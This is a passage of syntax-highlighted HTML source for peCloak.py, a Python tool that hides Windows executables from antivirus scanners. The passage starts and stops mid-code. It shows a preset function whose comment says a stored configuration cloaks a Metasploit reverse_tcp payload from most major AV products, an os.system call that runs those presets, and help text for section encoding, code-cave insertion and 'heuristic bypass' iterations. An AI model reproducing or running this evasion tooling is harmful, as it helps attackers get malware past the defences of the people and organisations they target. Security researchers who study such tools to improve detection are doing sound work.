pe.set_bytes_at_offset(raw_data&nbsp;+&nbsp;code_cave_raw_offset,&nbsp;code_cave)<br /><br /><span style="color:#3ad900;font-weight:400">'''<br />	If&nbsp;you&nbsp;find&nbsp;yourself&nbsp;cloaking&nbsp;the&nbsp;same&nbsp;type&nbsp;of&nbsp;files&nbsp;repeatedly&nbsp;(such&nbsp;as&nbsp;Metasploit&nbsp;payloads),&nbsp;you&nbsp;can&nbsp;use<br />	this&nbsp;function&nbsp;to&nbsp;store&nbsp;known&nbsp;bypass&nbsp;configurations.&nbsp;For&nbsp;example,&nbsp;implementing&nbsp;a&nbsp;3&nbsp;iteration&nbsp;heuristic&nbsp;bypass<br />	while&nbsp;encoding&nbsp;the&nbsp;entire&nbsp;.text&nbsp;section&nbsp;and&nbsp;the&nbsp;first&nbsp;30&nbsp;bytes&nbsp;of&nbsp;the&nbsp;.data&nbsp;section&nbsp;is&nbsp;enough&nbsp;to&nbsp;cloak&nbsp;a&nbsp;<br />	Metasploit&nbsp;reverse_tcp&nbsp;executable&nbsp;payload&nbsp;from&nbsp;most&nbsp;major&nbsp;AV&nbsp;products.&nbsp;Feel&nbsp;free&nbsp;to&nbsp;add&nbsp;more<br />'''</span><br /><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;execute_preset(program_name,&nbsp;preset,&nbsp;exe):<br /><br />	presets&nbsp;=&nbsp;[<br />				(<span style="color:#3ad900;font-weight:400">"Metasploit&nbsp;reverse&nbsp;tcp&nbsp;(shell_reverse_tcp)"</span>,<span style="color:#3ad900;font-weight:400">"&nbsp;-H&nbsp;3&nbsp;-e&nbsp;.text,.data:0:30"</span>)<br />			&nbsp;&nbsp;&nbsp;]<br />	index&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;preset&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"?"</span>:<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\nThe&nbsp;following&nbsp;preset&nbsp;encoding&nbsp;configurations&nbsp;are&nbsp;available:\n"</span><br />		<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;entry&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;presets:<br />			<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\t[%i]&nbsp;%s"</span>&nbsp;%&nbsp;(index,&nbsp;entry[<span style="color:#ff0044;font-weight:400">0</span>])<br />			<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\t\tConfig:&nbsp;&nbsp;%s\n"</span>&nbsp;%&nbsp;entry[<span style="color:#ff0044;font-weight:400">1</span>]&nbsp;<br />			index&nbsp;+=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />	<span style="color:#ff9d00;font-weight:700">else</span>:<br />		<span style="color:#ff9d00;font-weight:700">try</span>:<br />			<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\n[!]&nbsp;Running&nbsp;preset&nbsp;bypass&nbsp;configuration&nbsp;%s"</span>&nbsp;%&nbsp;presets[<span style="color:#ff9d00;font-weight:700">int</span>(preset)][<span style="color:#ff0044;font-weight:400">0</span>]<br />			<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\tConfig:&nbsp;%s&nbsp;\n"</span>&nbsp;%&nbsp;presets[<span style="color:#ff9d00;font-weight:700">int</span>(preset)][<span style="color:#ff0044;font-weight:400">1</span>]<br />			os.system(program_name&nbsp;+&nbsp;presets[<span style="color:#ff9d00;font-weight:700">int</span>(preset)][<span style="color:#ff0044;font-weight:400">1</span>]&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;\""</span>&nbsp;+&nbsp;exe&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"\""</span>)<br />		<span style="color:#ff9d00;font-weight:700">except</span>:<br />			<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\n[!]&nbsp;ERROR:&nbsp;Could&nbsp;no&nbsp;execute&nbsp;preset.&nbsp;Check&nbsp;your&nbsp;option&nbsp;and&nbsp;try&nbsp;again.&nbsp;Use&nbsp;'?'&nbsp;for&nbsp;a&nbsp;list&nbsp;of&nbsp;presets"</span><br />			sys.exit(<span style="color:#ff0044;font-weight:400">2</span>)<br />	<br /><span style="color:#3ad900;font-weight:400">'''<br />	usage<br />'''</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;print_usage():<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\nUsage:&nbsp;peCloak.py&nbsp;[[options]]&nbsp;[path_to_pe_file]&nbsp;\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"To&nbsp;encode&nbsp;a&nbsp;file&nbsp;(w/&nbsp;3&nbsp;heuristic&nbsp;bypass&nbsp;iterations)&nbsp;just&nbsp;call&nbsp;the&nbsp;script&nbsp;with&nbsp;a&nbsp;target&nbsp;filename&nbsp;and&nbsp;no&nbsp;options."</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"For&nbsp;more&nbsp;detailed&nbsp;help&nbsp;use&nbsp;the&nbsp;--help&nbsp;option\n"</span><br /><br /><span style="color:#3ad900;font-weight:400">'''<br />&nbsp;&nbsp;&nbsp;&nbsp;detailed&nbsp;help<br />'''</span>	<br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;print_help():<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\nUsage:&nbsp;peCloak.py&nbsp;[[options]]&nbsp;[path_to_pe_file]&nbsp;\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"To&nbsp;encode&nbsp;a&nbsp;file&nbsp;(w/&nbsp;3&nbsp;heuristic&nbsp;bypass&nbsp;iterations)&nbsp;just&nbsp;call&nbsp;the&nbsp;script&nbsp;with&nbsp;a&nbsp;target&nbsp;filename&nbsp;and&nbsp;no&nbsp;options."</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"For&nbsp;abbreviated&nbsp;help,&nbsp;use&nbsp;the&nbsp;-h&nbsp;option\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\n=========&nbsp;INFORMATIONAL&nbsp;OPTIONS&nbsp;=========\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"-h,&nbsp;--help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;You're&nbsp;looking&nbsp;at&nbsp;it\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"-i,&nbsp;--info=&nbsp;[section]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Print&nbsp;info&nbsp;for&nbsp;image&nbsp;/&nbsp;section"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Possible&nbsp;options:"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;all&nbsp;=&nbsp;print&nbsp;image&nbsp;info&nbsp;and&nbsp;detailed&nbsp;info&nbsp;for&nbsp;all&nbsp;sections"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;none&nbsp;=&nbsp;print&nbsp;info&nbsp;for&nbsp;image&nbsp;only"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[section_name]&nbsp;=&nbsp;print&nbsp;image&nbsp;info&nbsp;and&nbsp;detailed&nbsp;info&nbsp;for&nbsp;named&nbsp;section\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"-d,&nbsp;--dump&nbsp;[section:start:stop]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dump&nbsp;(print)&nbsp;hex&nbsp;/&nbsp;ascii&nbsp;for&nbsp;range&nbsp;of&nbsp;bytes&nbsp;of&nbsp;named&nbsp;section"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;The&nbsp;range&nbsp;is&nbsp;an&nbsp;offset&nbsp;(from&nbsp;section&nbsp;start)&nbsp;and&nbsp;byte&nbsp;count"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;You&nbsp;can&nbsp;provide&nbsp;the&nbsp;values&nbsp;in&nbsp;either&nbsp;decimal&nbsp;or&nbsp;hex&nbsp;but"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;keep&nbsp;in&nbsp;mind&nbsp;that&nbsp;these&nbsp;are&nbsp;offsets&nbsp;from&nbsp;the&nbsp;section&nbsp;start!\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Example&nbsp;1:&nbsp;-p&nbsp;.text:0-2000&nbsp;means&nbsp;start&nbsp;at&nbsp;offset&nbsp;0&nbsp;of"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.text&nbsp;section&nbsp;and&nbsp;print&nbsp;2000&nbsp;bytes&nbsp;in&nbsp;total\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Example2&nbsp;:&nbsp;-p&nbsp;.text:14h-1000&nbsp;means&nbsp;start&nbsp;at&nbsp;offset&nbsp;14&nbsp;hex&nbsp;(20d)&nbsp;of"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.text&nbsp;section&nbsp;and&nbsp;print&nbsp;1000&nbsp;bytes&nbsp;in&nbsp;total\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\n=========&nbsp;CORE&nbsp;CLOAK&nbsp;OPTIONS&nbsp;=========\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"-e,&nbsp;--encode=&nbsp;[section:offset:length]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Encode&nbsp;the&nbsp;named&nbsp;section.&nbsp;By&nbsp;default,&nbsp;running&nbsp;this&nbsp;script&nbsp;without"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;specifying&nbsp;this&nbsp;option&nbsp;will&nbsp;encode&nbsp;the&nbsp;.text&nbsp;section.&nbsp;You&nbsp;can&nbsp;also"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;use&nbsp;this&nbsp;option&nbsp;to&nbsp;specify&nbsp;a&nbsp;different&nbsp;section.&nbsp;To&nbsp;name&nbsp;multiple&nbsp;sections"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;separate&nbsp;them&nbsp;by&nbsp;commas.&nbsp;Note:&nbsp;range&nbsp;values&nbsp;are&nbsp;base&nbsp;10&nbsp;integers!"</span>&nbsp;<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Examples:"</span>&nbsp;<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-e&nbsp;.text:5:500&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;encode&nbsp;500&nbsp;bytes&nbsp;of&nbsp;.text&nbsp;section&nbsp;starting&nbsp;at&nbsp;offset&nbsp;5"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-e&nbsp;.rdata:100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;encode&nbsp;.rdata&nbsp;section&nbsp;starting&nbsp;at&nbsp;offset&nbsp;100"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-e&nbsp;.text,&nbsp;.rdata&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;encode&nbsp;all&nbsp;of&nbsp;.text&nbsp;and&nbsp;.rdata&nbsp;sections"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-e&nbsp;.text,&nbsp;rdata:0:100&nbsp;&nbsp;encode&nbsp;all&nbsp;of&nbsp;.text&nbsp;section&nbsp;and&nbsp;first&nbsp;100&nbsp;bytes&nbsp;of&nbsp;.rdata\n"</span>&nbsp;<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"-a,&nbsp;--add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Force&nbsp;addition&nbsp;of&nbsp;new&nbsp;section&nbsp;(.NewSec)&nbsp;for&nbsp;code&nbsp;cave"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Otherwise&nbsp;the&nbsp;script&nbsp;will&nbsp;try&nbsp;to&nbsp;add&nbsp;it&nbsp;to&nbsp;the&nbsp;existing&nbsp;.text/.code&nbsp;section"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;enough&nbsp;room&nbsp;is&nbsp;found."</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"-H,&nbsp;--heuristic=&nbsp;[x]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Specify&nbsp;the&nbsp;number&nbsp;of&nbsp;iterations&nbsp;for&nbsp;the&nbsp;"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;heuristic&nbsp;bypass&nbsp;code&nbsp;(default=3)\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"-p,&nbsp;--preset=&nbsp;[preset]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Use&nbsp;a&nbsp;preset&nbsp;encoding&nbsp;configuration&nbsp;to&nbsp;cloak&nbsp;your&nbsp;executable"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Useful&nbsp;if&nbsp;you&nbsp;cloak&nbsp;the&nbsp;same&nbsp;types&nbsp;of&nbsp;files&nbsp;frequenty&nbsp;(e.g.&nbsp;Metasploit&nbsp;payloads)"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span 